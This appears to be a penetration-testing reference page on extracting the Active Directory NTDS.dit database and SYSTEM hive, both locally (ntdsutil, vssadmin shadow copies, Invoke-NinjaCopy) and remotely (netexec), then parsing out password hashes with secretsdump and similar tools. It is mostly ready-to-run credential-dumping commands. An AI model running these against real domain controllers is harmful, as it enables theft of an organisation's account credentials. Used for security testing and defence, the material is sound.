NTDS (Windows NT Directory Services) is the directory services used by Microsoft Windows NT to locate, manage, and organize network resources. The **NTDS.dit** file is a database that stores the Active Directory data (including users, groups, security descriptors and password hashes). This file is stored on the domain controllers.

## I. Local dumping
### 1. Exfiltration
Since the `NTDS.dit` is constantly used by AD processes such as the Kerberos KDC, it can't be copied like any other file.

The `SYSTEM` registry hive contains enough info to decrypt the `NTDS.dit` data. The hive file (`\system32\config\system`) can either be exfiltrated the same way the `NTDS.dit` file is, or it can be exported with
```bash
reg save HKLM\SYSTEM 'C:\Windows\Temp\system.save'
```
#### NTDSUtil
NTDSUtil.exe is a diagnostic tool available as part of Active Directory. It has the ability to save a snapshot of the Active Directory data. Running the following command will copy the NTDS.dit database and the SYSTEM and SECURITY hives to `C:\Windows\Temp`
```bash
ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit
```
#### VSSAdmin
VSS (Volume Shadow Copy) is a Microsoft Windows technology, implemented as a service, that allows the creation of backup copies of files or volumes, even when they are in use.
```bash
vssadmin create shadow /for=C:
```
Once the VSS is created for the target drive, it is then possible to copy the target files from it.
```bash
copy $ShadowCopyName\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit.save
copy $ShadowCopyName\Windows\System32\config\SYSTEM C:\Windows\Temp\system.save
```
Once the required files are exfiltrated, the shadow copy can be removed
```bash
vssadmin delete shadows /shadow=$ShadowCopyId
```
#### NTFS structure parsing
[Invoke-NinjaCopy](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) is a PowerShell script part of the PowerSploit suite able to "copy files off an NTFS volume by opening a read handle to the entire volume (such as c:) and parsing the NTFS structures. This technique is stealthier than the others.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\NTDS\NTDS.dit" -LocalDestination "C:\Windows\Temp\ntds.dit.save"
```
### 2. Parsing
Once the required files are exfiltrated, they can be parsed by tools like secretsdump (Python, part of Impacket) or [gosecretsdump](https://github.com/C-Sto/gosecretsdump) (Go, faster for big files).
```bash
secretsdump -ntds ntds.dit.save -system system.save LOCAL
gosecretsdump -ntds ntds.dit.save -system system.save
```
#### NTDS Directory parsing and extraction
With the required files, it is possible to extract more information than just secrets. The NTDS file is responsible for storing the entire directory, with users, groups, OUs, trusted domains etc... This data can be retrieved by parsing the NTDS with tools like [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)
```bash
ntdsdotsqlite ntds.dit -o ntds.sqlite
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
## II. Remote dumping
### 1. netexec
!!! note
    !!! warning 
        Requires Domain Admin or Local Admin Priviledges on target Domain Controller
    ```bash
    2 methods are available:   
    (default) 	drsuapi -  Uses drsuapi RPC interface create a handle, trigger replication, and     combined with additional drsuapi calls to convert the resultant linked-lists into readable format  
			    vss - Uses the Volume Shadow copy Service  
    ```
```bash
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users --enabled
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds vss
```
There is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with secretsdump.py
```bash
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil
```